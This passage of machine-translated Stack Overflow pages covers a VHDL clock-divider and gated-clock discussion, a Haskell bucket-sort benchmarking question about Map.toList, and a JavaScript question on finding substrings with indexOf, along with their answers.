图书馆 ieee；使用 ieee.numeric_std.all；

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T09:57:19.983

您的两个样本都会产生一个信号，其中一个以慢速切换，其中一个以“慢速”脉冲窄脉冲。如果这两个信号都进入其他触发器的时钟输入，我预计会收到有关时钟路由非最佳的警告。

我不确定您为什么会收到门控时钟警告，这通常发生在您这样做时：

```
gated_clock <= clock when en = '1' else '0'; 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2017-07-04T00:21:33.857

这是一个完整的示例代码：

```
LIBRARY IEEE;
USE IEEE.STD_LOGIC_1164.ALL;
USE IEEE.NUMERIC_STD.ALL;

ENTITY Test123 IS

    GENERIC (
        clk_1_freq_generic : unsigned(31 DOWNTO 0) := to_unsigned(0, 32); -- Presented in Hz
        clk_in1_freq_generic : unsigned(31 DOWNTO 0) := to_unsigned(0, 32) -- Presented in Hz, Also
    );

    PORT (
        clk_in1 : IN std_logic := '0';
        rst1 : IN std_logic := '0';
        en1 : IN std_logic := '0';
        clk_1 : OUT std_logic := '0'
    );

END ENTITY Test123;

ARCHITECTURE Test123_Arch OF Test123 IS
    --
    SIGNAL clk_en_en : std_logic := '0';
    SIGNAL clk_en_cntr1 : unsigned(31 DOWNTO 0) := (OTHERS => '0');
    --
    SIGNAL clk_1_buffer : std_logic := '0';
    SIGNAL clk_1_freq : unsigned(31 DOWNTO 0) := (OTHERS => '0'); -- Presented in Hz, Also
    SIGNAL clk_in1_freq : unsigned(31 DOWNTO 0) := (OTHERS => '0'); -- Presented in Hz
    --
    SIGNAL clk_prescaler1 : unsigned(31 DOWNTO 0) := (OTHERS => '0'); -- Presented in Cycles (Relative To The Input Clk.)
    SIGNAL clk_prescaler1_halved : unsigned(31 DOWNTO 0) := (OTHERS => '0');
    --

BEGIN
    clk_en_gen : PROCESS (clk_in1)
    BEGIN
        IF (clk_en_en = '1') THEN

            IF (rising_edge(clk_in1)) THEN
                clk_en_cntr1 <= clk_en_cntr1 + 1;

                IF ((clk_en_cntr1 + 1) = clk_prescaler1_halved) THEN   -- a Register's (F/F) Output Only Updates Upon a Clock-Edge : That's Why This Comparison Is Done This Way !

                    clk_1_buffer <= NOT clk_1_buffer;
                    clk_1 <= clk_1_buffer;
                    clk_en_cntr1 <= (OTHERS => '0');

                END IF;

            END IF;

        ELSIF (clk_en_en = '0') THEN

            clk_1_buffer <= '0';
            clk_1 <= clk_1_buffer;
            clk_en_cntr1 <= (OTHERS => '0'); -- Clear Counter 'clk_en_cntr1'

        END IF;

    END PROCESS;

    update_clk_prescalers : PROCESS (clk_in1_freq, clk_1_freq)
    BEGIN
        clk_prescaler1 <= (OTHERS => '0');
        clk_prescaler1_halved <= (OTHERS => '0');
        clk_en_en <= '0';

        IF ((clk_in1_freq > 0) AND (clk_1_freq > 0)) THEN

            clk_prescaler1 <= (clk_in1_freq / clk_1_freq); -- a Register's (F/F) Output Only Updates Upon a Clock-Edge : That's Why This Assignment Is Done This Way !
            clk_prescaler1_halved <= ((clk_in1_freq / clk_1_freq) / 2); -- (Same Thing Here)

            IF (((clk_in1_freq / clk_1_freq) / 2) > 0) THEN -- (Same Thing Here, Too)
                clk_en_en <= '1';
            END IF;

        ELSE
            NULL;
        END IF;

    END PROCESS;

    clk_1_freq <= clk_1_freq_generic;
    clk_in1_freq <= clk_in1_freq_generic;

END ARCHITECTURE Test123_Arch; 
```

# haskell - Haskell 中的 Map.toList 性能

> ID：15244994
> 
> 赞同：5
> 
> 时间：2013-03-06T10:37:40.967
> 
> 标签：haskell, benchmarking, bucket-sort

在下面的代码中，我正在对桶排序的实现进行基准测试。

该`bucketsort`函数使用结果，`_bucketsort`但将其展平为单个列表。令我惊讶的是，这个过程 ( `Map.toList`) 需要很多时间。

```
module Main where
import System.Random
import Criterion.Main
import qualified Data.List as List
import qualified Data.Map as Map
import Data.Maybe

insert :: (Ord a) => a -> [a] -> [a]
insert x [] = [x]
insert x (y:xs)
    | x <= y    = x:y:xs
    | otherwise = y : insert x xs

bucketsort :: (Integral a) => [a] -> [a]
bucketsort xs = List.concatMap (snd) . Map.toList $ _bucketsort xs Map.empty

_bucketsort :: (Integral k) => [k] -> Map.Map k [k] -> Map.Map k [k]
_bucketsort [] map = map
_bucketsort (x:xs) map =
    let bucket = x `div` 3
        bucketlist = maybeToList $ Map.lookup bucket map
        bucketInsert x [] = [x]
        bucketInsert x xs = insert x $ head xs
        ys = bucketInsert x bucketlist
        newMap = Map.insert bucket ys map
    in _bucketsort xs newMap

dataset n = List.take n $ randomRs (0, 9999) (mkStdGen 42)

main = defaultMain [ bench "bucketsort 96080" $ whnf bucketsort ((dataset 96080) :: [Int])
                   , bench "_bucketsort 96080" $ whnf _bucketsort ((dataset 96080):: [Int])] 
```

这是 Criterion 的基准测试的输出：

```
C:\>benchmark_bucketsort.exe
warming up
estimating clock resolution...
mean is 1.353299 us (640001 iterations)
found 1278266 outliers among 639999 samples (199.7%)
  638267 (99.7%) low severe
  639999 (100.0%) high severe
estimating cost of a clock call...
mean is 105.8728 ns (8 iterations)
found 14 outliers among 8 samples (175.0%)
  7 (87.5%) low severe
  7 (87.5%) high severe

benchmarking bucketsort 96080
collecting 100 samples, 1 iterations each, in estimated 24.35308 s
Warning: Couldn't open /dev/urandom
Warning: using system clock for seed instead (quality will be lower)
mean: 187.2037 ms, lb 182.7181 ms, ub 191.3842 ms, ci 0.950
std dev: 22.15054 ms, lb 19.47241 ms, ub 25.64983 ms, ci 0.950
variance introduced by outliers: 84.194%
variance is severely inflated by outliers

benchmarking _bucketsort 96080
mean: 8.823789 ns, lb 8.654692 ns, ub 9.049314 ns, ci 0.950
std dev: 952.9240 ps, lb 723.0241 ps, ub 1.154097 ns, ci 0.950
found 13 outliers among 100 samples (13.0%)
  13 (13.0%) high severe
variance introduced by outliers: 82.077%
variance is severely inflated by outliers 
```

`bucketsort`如果我的函数可以写得更好并且希望更快，我不会感到惊讶。但到目前为止我还没有弄清楚怎么做。

此外，非常欢迎对我的 Haskell 代码进行任何改进/评论。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-06T11:31:49.930

您没有`_bucketsort`在第二个基准测试中完全应用，因此只是对 WHNF 的部分应用函数进行评估，不出所料，这很快。

将相关行更改为

```
main = defaultMain [ bench "bucketsort 96080"  $ whnf bucketsort ((dataset 96080) :: [Int])
                   , bench "_bucketsort 96080" $ whnf (flip _bucketsort Map.empty) ((dataset 96080):: [Int])] 
```

产量（在我的机器上）：

```
warming up
estimating clock resolution...
mean is 2.357120 us (320001 iterations)
found 2630 outliers among 319999 samples (0.8%)
  2427 (0.8%) high severe
estimating cost of a clock call...
mean is 666.7750 ns (14 iterations)
found 1 outliers among 14 samples (7.1%)
  1 (7.1%) high severe

benchmarking bucketsort 96080
collecting 100 samples, 1 iterations each, in estimated 34.66980 s
mean: 244.3280 ms, lb 238.0601 ms, ub 250.6725 ms, ci 0.950
std dev: 32.37658 ms, lb 28.02356 ms, ub 38.10187 ms, ci 0.950
found 3 outliers among 100 samples (3.0%)
  3 (3.0%) low mild
variance introduced by outliers: 87.311%
variance is severely inflated by outliers

benchmarking _bucketsort 96080
collecting 100 samples, 1 iterations each, in estimated 24.65911 s
mean: 244.9425 ms, lb 239.1011 ms, ub 251.0300 ms, ci 0.950
std dev: 30.68877 ms, lb 26.48151 ms, ub 36.20961 ms, ci 0.950
variance introduced by outliers: 86.247%
variance is severely inflated by outliers 
```

此外请注意，此基准测试并不完全强制列表，因为`whnf`在列表上只会评估顶级构造函数。这解释了为什么两个基准测试现在具有几乎相同的性能。将两个基准切换到`nf`分别将时间更改为 369.3022 毫秒和 354.3513 毫秒，`bucketsort`再次变慢。

# javascript - 如何使用 indexOf 确定 Javascript 中的某个字符集

> ID：15244997
> 
> 赞同：1
> 
> 时间：2013-03-06T10:37:45.603
> 
> 标签：javascript, arrays, list, indexof

假设我有一个包含 30 个字符串的数组。

我想确定字符串是否包含“ea”字符，然后我会提醒包含 ea 的字符串。

我想使用 indexOf 我该怎么做？

假设我有一个数组

var new = ["香蕉","苹果","橙子"];

我尝试了类似...

```
new_an = new.indexOf("an");
for (i=0; i < new.length;i++ )
{

if (new_an = -1)
{
    alert(new[i]);
}
} 
```

所以只有香蕉和橙子里面有一个，我只想提醒这两个……但不确定我在这里错过了什么……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:23.477

如果给定字符串中没有匹配项，则[indexOf返回 -1。](http://www.w3schools.com/jsref/jsref_indexof.asp)你可以这样做：

```
var arr = ["string 1", "string 2", "string 3", "test"];
for(var i = 0; i < arr.length; i++) {
  if(arr[i].indexOf('str') != -1) {
    console.log(arr[i]);
  }
} 
```

这个例子的输出应该是：string 1, string 2, string 3

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:41:12.440

在字符串数组的循环中使用以下解决方案。

```
Example

Search a string for "welcome":

var str="Hello world, welcome to the universe.";
var n=str.indexOf("welcome");
The result of n will be:

13 
```

[请参阅此处了解更多详细信息](http://www.w3schools.com/jsref/jsref_indexof.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:41:56.113

我会简单地遍历数组，然后检查`String.contains()`您的搜索字符串是否在原始字符串中。

```
str.contains(searchString); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:45:05.457

```
function searchStringInArray (str, strArray) {
    for (var j=0; j<strArray.length; j++) {
        if (strArray[j].match(str)) return j;
    }
    return -1;
} 
```

j 是数组中 str 的索引。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:47:55.023

一种使用方式[`filter`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/filter)；

```
var it   = ["aea", "b", "c", "dea", "eee", "fea"];
var find = "ea";

var matches = it.filter(function(el) {
  return el.indexOf(find) > -1;
});

alert(matches); 
```